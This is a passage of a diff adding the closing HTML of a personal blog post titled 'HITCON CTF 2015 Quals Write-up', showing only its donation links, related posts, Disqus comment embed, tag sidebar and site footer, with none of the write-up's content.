+            <a href="mailto:?subject=HITCON%20CTF%202015%20Quals%20Write-up&amp;body=https%3A//blog.m157q.tw/posts/2015/10/19/hitcon-ctf-2015-quals-write-up/" target="_blank" title="Share via Email"><i class="fa fa-envelope-o fa-3x"></i></a>
+        </p>
+    </section>
+
+<hr>
+<section id="donation">
+    <h3>Donation</h3>
+    <p id="donation-chinese">
+      如果覺得這篇文章對你有幫助，
+      除了留言讓我知道外，
+      或許也可以考慮請我喝杯咖啡，
+      不論金額多寡我都會非常感激且能鼓勵我繼續寫出對你有幫助的文章。
+    </p>
+    <p id="donation-english">
+      If this blog post happens to be helpful to you, besides of leaving a reply, you may consider buy me a cup of coffee to support me. It would help me write more articles helpful to you in the future and I would really appreciate it.
+    </p>
+    <ul id="donation-address">
+			<li><a href="https://payment.opay.tw/Broadcaster/Donate/4E163AAE10E448A30DB244CF85527271">歐付寶</a></li>
+
+        <li><a href="https://buymeacoffee.com/M157q">Buy Me a Coffee</a></li>
+
+
+			<li>BTC: <a href="https://blockchain.info/address/3QZy3cHvoZcszuqWK5CdCutLEJLeAX5ip6">3QZy3cHvoZcszuqWK5CdCutLEJLeAX5ip6</a></li>
+
+			<li>USDT Omni: <a href="https://blockchain.info/address/3QZy3cHvoZcszuqWK5CdCutLEJLeAX5ip6">3QZy3cHvoZcszuqWK5CdCutLEJLeAX5ip6</a></li>
+
+			<li>ETH: <a href="https://etherscan.io/address/0x926bf92b29de4C6E15CbCE99e0a7aB053877181b">0x926bf92b29de4C6E15CbCE99e0a7aB053877181b</a></li>
+
+			<li>USDT ERC20: <a href="https://etherscan.io/address/0x926bf92b29de4C6E15CbCE99e0a7aB053877181b">0x926bf92b29de4C6E15CbCE99e0a7aB053877181b</a></li>
+
+			<li>DAI: <a href="https://etherscan.io/address/0x926bf92b29de4C6E15CbCE99e0a7aB053877181b">0x926bf92b29de4C6E15CbCE99e0a7aB053877181b</a></li>
+
+			<li>LTC: <a href="https://chainz.cryptoid.info/ltc/address.dws?MD26bUR4VsykGp8Ky2QbstejoFGJaj3hpM.htm">MD26bUR4VsykGp8Ky2QbstejoFGJaj3hpM</a></li>
+    </ul>
+</section>
+
+    <hr>
+    <h3>Related Posts</h3>
+    <!-- TODO: Use fancier related layout, as in http://kevin.deldycke.com/2012/04/beautify-contextual-related-posts-wordpress-plugin/ -->
+    <ul>
+        <li><a href="https://blog.m157q.tw/posts/2015/08/29/hitcon-2015-iot-wargame/">HITCON 2015 IOT Wargame</a></li>
+        <li><a href="https://blog.m157q.tw/posts/2016/12/19/y2016w50/">Y2016W50</a></li>
+        <li><a href="https://blog.m157q.tw/posts/2015/03/30/0ctf-2015-note/">0CTF 2015 Note</a></li>
+        <li><a href="https://blog.m157q.tw/posts/2015/01/21/dhc-rest-http-api-client/">DHC - REST/HTTP API Client</a></li>
+        <li><a href="https://blog.m157q.tw/posts/2017/08/07/y2017w31/">Y2017W31</a></li>
+      </ul>
+
+    <div class="comments">
+      <div id="disqus_thread"></div>
+	  <script type="text/javascript">
+        var disqus_shortname = 'm157q-logdown';
+        var disqus_identifier = "posts/2015/10/19/hitcon-ctf-2015-quals-write-up/";
+        var disqus_title = "HITCON CTF 2015 Quals Write-up";
+        var disqus_url = "https://blog.m157q.tw/posts/2015/10/19/hitcon-ctf-2015-quals-write-up/";
+
+        var disqus_config = function () {
+            this.page.url = disqus_url;
+            this.page.identifier = disqus_identifier;
+        };
+        (function() {
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus</a>.</noscript>
+    </div>
+
+        </div>
+
+          <div class="col-md-3">
+  <div class="well">
+
+    <p><abbr title="2015-10-19T11:42:55+08:00"><i class="fa fa-calendar"></i> Mon 19 October 2015</abbr></p>
+
+
+      <p><address>
+        <i class="fa fa-user"></i> By
+          <a href="https://blog.m157q.tw/author/m157q.html" rel="author">m157q</a>
+      </address></p>
+
+    <hr/>
+
+      <p>
+              <p>
+              <a href="https://blog.m157q.tw/category/confmeetup/" rel="tag"
+                  data-toggle="tooltip"
+                  class="label label-info"
+                  title="49 articles in this category">Conf/Meetup</a>
+              </p>
+            <a href="/tag/security/" data-toggle="tooltip"
+      class="label label-default"
+      title="52 articles with this tag">security</a>
+  <br>
+            <a href="/tag/conf/" data-toggle="tooltip"
+      class="label label-default"
+      title="10 articles with this tag">conf</a>
+  <br>
+            <a href="/tag/ctf/" data-toggle="tooltip"
+      class="label label-default"
+      title="5 articles with this tag">ctf</a>
+  <br>
+            <a href="/tag/hitcon/" data-toggle="tooltip"
+      class="label label-default"
+      title="4 articles with this tag">HITCON</a>
+  <br>
+            <a href="/tag/write-up/" data-toggle="tooltip"
+      class="label label-default"
+      title="3 articles with this tag">Write-up</a>
+  <br>
+            <a href="/tag/ruby/" data-toggle="tooltip"
+      class="label label-default"
+      title="2 articles with this tag">ruby</a>
+  <br>
+      </p>
+      <hr/>
+
+
+      <nav>
+        <ul class="pager">
+          <li class="previous ">
+            <a  href="https://blog.m157q.tw/posts/2015/10/07/fix-virtualenv-after-an-upgrade-of-python/" title="Fix virtualenv after an upgrade of Python"  rel="prev">
+              <span aria-hidden="true">←</span> Older
+            </a>
+          </li>
+          <li class="next ">
+            <a  href="https://blog.m157q.tw/posts/2015/11/24/cyber-formula-within-my-childhood-memory/" title="童年回憶之閃電霹靂車"  rel="next">
+              Newer <span aria-hidden="true">→</span>
+            </a>
+          </li>
+        </ul>
+      </nav>
+
+  </div>
+            
+          </div>
+
+      </div>
+
+    </div>
+
+    <!-- TODO: make footer sticky -->
+    <footer class="container-fluid">
+      <div class="container">
+        <div class="row">
+
+            <div class="col-md-2">
+                <h5>Social</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="https://github.com/M157q">
+      <i class="fa fa-github"></i>
+    GitHub
+  </a></li>
+                  <li>  <a href="https://twitter.com/M157q">
+      <i class="fa fa-twitter"></i>
+    Twitter
+  </a></li>
+                </ul>
+            </div>
+            <div class="col-md-2">
+                <h5>Links</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="http://getpelican.com/">
+      <img src="https://www.google.com/s2/favicons?domain=getpelican.com" width="16" height="16" class="icon" alt="getpelican.com icon"/>
+    Pelican
+  </a></li>
+                  <li>  <a href="http://python.org/">
+      <img src="https://www.google.com/s2/favicons?domain=python.org" width="16" height="16" class="icon" alt="python.org icon"/>
+    Python.org
+  </a></li>
+                  <li>  <a href="http://jinja.pocoo.org/">
+      <img src="https://www.google.com/s2/favicons?domain=jinja.pocoo.org" width="16" height="16" class="icon" alt="jinja.pocoo.org icon"/>
+    Jinja2
+  </a></li>
+                </ul>
+            </div>
+
+          <div class="col-md-2">
+            <h5>Browse content by</h5>
+            <ul class="list-unstyled">
+                <li><a href="https://blog.m157q.tw/categories/index.html"><i class="fa fa-tags"></i> Categories</a></li>
+                <li><a href="https://blog.m157q.tw/archives/index.html"><i class="fa fa-calendar"></i> Dates</a></li>
+                <li><a href="https://blog.m157q.tw/tags/index.html"><i class="fa fa-tag"></i> Tags</a></li>
+            </ul>
+          </div>
+
+          <div class="col-md-2 text-muted">
+            <h5>Copyright notice</h5>
+            <p>© Copyright 2013-2021 m157q.</p>
+          </div>
+
+          <div class="col-md-2 text-muted">
+            <h5>Disclaimer</h5>
+              <p>All opinions expressed in this site are my own personal opinions and are not endorsed by, nor do they represent the opinions of my previous, current and future employers or any of its affiliates, partners or customers.</p>
+          </div>
+
+          <div class="col-md-2">
+              <h5>Feeds</h5>
+              <ul class="list-unstyled">
+                  <li><small><a href="https://blog.m157q.tw/feeds/all.feed.atom.xml"><i class="fa fa-rss"></i> All posts (Atom)</a></small></li>
+                  <li><small><a href="https://blog.m157q.tw/feeds/atom.xml"><i class="fa fa-rss"></i> Latest posts (Atom)</a></small></li>
+                  <li><small><a href="https://blog.m157q.tw/feeds/category.confmeetup.atom.xml"><i class="fa fa-rss"></i> Category: Conf/Meetup (Atom)</a></small></li>
+              </ul>
+          </div>
+
+        </div>
+      </div>
+
+      <h5 class="text-right"><a href="#"><i class="fa fa-arrow-up"></i> Back to top</a></h5>
+
+      <div class="container">
+        <div class="row col-md-12 text-muted text-center">
+          Site generated by <a href="https://getpelican.com"> Pelican</a>.<br/>
+          <a href="https://github.com/kdeldycke/plumage"> Plumage</a> theme by <a href="https://kevin.deldycke.com">Kevin Deldycke</a>.
+        </div>
+      </div>
+
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fitvids/1.1.0/jquery.fitvids.min.js"></script>
+    <script src="https://blog.m157q.tw/theme/js/jquery.mglass.js"></script>
+    <script src="https://blog.m157q.tw/theme/js/application.js"></script>
+
+  </body>
+</html>
